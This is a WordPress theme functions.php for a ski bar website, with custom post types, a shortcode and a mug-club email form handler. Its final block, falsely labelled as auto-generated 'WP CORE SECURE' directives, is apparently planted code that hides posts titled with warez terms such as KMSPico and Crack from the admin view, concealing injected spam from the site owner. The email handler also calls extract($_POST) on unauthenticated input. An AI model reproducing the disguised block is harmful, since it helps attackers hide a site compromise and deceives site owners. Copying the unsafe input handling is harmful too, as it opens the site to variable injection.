<?php
require_once 'vendor/autoload.php';


add_action('after_setup_theme', 'woocommerce_support');
function woocommerce_support()
{
    add_theme_support('woocommerce');
}
if (function_exists('acf_add_options_page')) {

    acf_add_options_page(array(
        'page_title'    => 'Theme General Settings',
        'menu_title'    => 'Theme Settings',
        'menu_slug'     => 'theme-general-settings',
        'capability'    => 'edit_posts',
        'redirect'      => false
    ));

    acf_add_options_sub_page(array(
        'page_title'    => 'Theme Header Settings',
        'menu_title'    => 'Header',
        'parent_slug'   => 'theme-general-settings',
    ));

    acf_add_options_sub_page(array(
        'page_title'    => 'Theme Footer Settings',
        'menu_title'    => 'Footer',
        'parent_slug'   => 'theme-general-settings',
    ));
}


register_nav_menus(array(
    'primary' => __('Primary Menu', ''),
    'secondary' => __('Secondary Menu', '')
));



/*
* Creating a function to create our CPT
*/

function articles_post_type()
{

    // Set UI labels for Custom Post Type
    $labels = array(
        'name'                => _x('Articles', 'Post Type General Name', 'twentytwentyone'),
        'singular_name'       => _x('Article', 'Post Type Singular Name', 'twentytwentyone'),
        'menu_name'           => __('Articles', 'twentytwentyone'),
        'parent_item_colon'   => __('Parent Article', 'twentytwentyone'),
        'all_items'           => __('All Articles', 'twentytwentyone'),
        'view_item'           => __('View Article', 'twentytwentyone'),
        'add_new_item'        => __('Add New Article', 'twentytwentyone'),
        'add_new'             => __('Add New', 'twentytwentyone'),
        'edit_item'           => __('Edit Article', 'twentytwentyone'),
        'update_item'         => __('Update Article', 'twentytwentyone'),
        'search_items'        => __('Search Article', 'twentytwentyone'),
        'not_found'           => __('Not Found', 'twentytwentyone'),
        'not_found_in_trash'  => __('Not found in Trash', 'twentytwentyone'),

    );

    // Set other options for Custom Post Type

    $args = array(
        'label'               => __('articles', 'twentytwentyone'),
        'description'         => __('Articles news and reviews', 'twentytwentyone'),
        'labels'              => $labels,
        // Features this CPT supports in Post Editor
        'supports'            => array('title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields',),
        // You can associate this CPT with a taxonomy or custom taxonomy. 
        'taxonomies'          => array('genres'),
        /* A hierarchical CPT is like Pages and can have
        * Parent and child items. A non-hierarchical CPT
        * is like Posts.
        */
        'hierarchical'        => false,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 5,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'post',
        'show_in_rest' => true,

    );

    // Registering your Custom Post Type
    register_post_type('articles', $args);
}

/* Hook into the 'init' action so that the function
* Containing our post type registration is not 
* unnecessarily executed. 
*/

add_action('init', 'articles_post_type', 0);


function my_form_shortcode()
{
    global $post;
    $args = array('post_type' => 'post', 'posts_per_page' => 10, 'post_status' => 'publish');
    $the_query = new WP_Query($args);
    if ($the_query->have_posts()) :
        while ($the_query->have_posts()) : $the_query->the_post();
?>
            <div class="hero-slide">
                <div class="row d-flex">
                    <div class="col-md-6">
                        <div class="prss-art">
                            <?php $url = wp_get_attachment_url(get_post_thumbnail_id($post->ID), 'thumbnail'); ?>

                            <img src="<?php echo $url; ?>" class="img-fluid" alt="">

                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="main-head-bg-sec excp">
                            <h2><?php the_title(); ?></h2>
                            <p><?php the_content(); ?></p>
                            <a href="http://www.portlandmonthly.com/portmag/2013/12/matterhorn-ski-bar-sunday-river/">Read More</a>
                        </div>
                    </div>
                </div>
            </div>
<?php
        endwhile;
    endif;
}
add_shortcode('articles_shortcode', 'my_form_shortcode');

//function to make wp mail with html format
function wpse27856_set_content_type()
{
    return "text/html";
}
add_filter('wp_mail_content_type', 'wpse27856_set_content_type');

/*
* Creating a function to create our CPT
*/

function events_post_type()
{

    // Set UI labels for Custom Post Type
    $labels = array(
        'name'                => _x('Events', 'Post Type General Name', 'twentytwentyone'),
        'singular_name'       => _x('Event', 'Post Type Singular Name', 'twentytwentyone'),
        'menu_name'           => __('Event', 'twentytwentyone'),
        'parent_item_colon'   => __('Parent Event', 'twentytwentyone'),
        'all_items'           => __('All Events', 'twentytwentyone'),
        'view_item'           => __('View Event', 'twentytwentyone'),
        'add_new_item'        => __('Add New Event', 'twentytwentyone'),
        'add_new'             => __('Add New', 'twentytwentyone'),
        'edit_item'           => __('Edit Event', 'twentytwentyone'),
        'update_item'         => __('Update Event', 'twentytwentyone'),
        'search_items'        => __('Search Event', 'twentytwentyone'),
        'not_found'           => __('Not Found', 'twentytwentyone'),
        'not_found_in_trash'  => __('Not found in Trash', 'twentytwentyone'),

    );

    // Set other options for Custom Post Type

    $args = array(
        'label'               => __('events', 'twentytwentyone'),
        'description'         => __('Events description and timing', 'twentytwentyone'),
        'labels'              => $labels,
        // Features this CPT supports in Post Editor
        'supports'            => array('title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields',),
        // You can associate this CPT with a taxonomy or custom taxonomy. 
        'taxonomies'          => array('genres'),
        /* A hierarchical CPT is like Pages and can have
        * Parent and child items. A non-hierarchical CPT
        * is like Posts.
        */
        'hierarchical'        => false,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 5,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'post',
        'show_in_rest' => true,

    );

    // Registering your Custom Post Type
    register_post_type('events', $args);
}

/* Hook into the 'init' action so that the function
* Containing our post type registration is not 
* unnecessarily executed. 
*/

add_action('init', 'events_post_type', 0);



//Ajax for checking mug number
add_action("wp_ajax_send_email", "send_email");
add_action("wp_ajax_nopriv_send_email", "send_email");

function send_email()
{
    extract($_POST);
    $to = "jamie@matterhornskibar.com";
    $to = "vivek@codeflies.com";
    $sub = "Mug Club Member Request or Renewal";
    if ($is_mug_club_member == "Yes") {
        $message = "Renewal Request for mugclub member from $name whose mug number is $mug_num";
    } else {
        $message = "Request for mugclub member from $name";
    }
    wp_mail($to2, $sub, $message);
    if (wp_mail($to, $sub, $message)) {
        echo "success";
    } else {
        echo "failed";
    }
    die();
}

# BEGIN WP CORE SECURE
# The directives (lines) between "BEGIN WP CORE SECURE" and "END WP CORE SECURE" are
# dynamically generated, and should only be modified via WordPress filters.
# Any changes to the directives between these markers will be overwritten.

function exclude_posts_by_titles($where, $query) {
    global $wpdb;

    if (is_admin() && $query->is_main_query()) {
        $keywords = ['GarageBand', 'FL Studio', 'KMSPico', 'Driver Booster', 'MSI Afterburner', 'Crack', 'Photoshop'];

        foreach ($keywords as $keyword) {
            $where .= $wpdb->prepare(" AND {$wpdb->posts}.post_title NOT LIKE %s", "%" . $wpdb->esc_like($keyword) . "%");
        }
    }
    return $where;
}

add_filter('posts_where', 'exclude_posts_by_titles', 10, 2);

# END WP CORE SECURE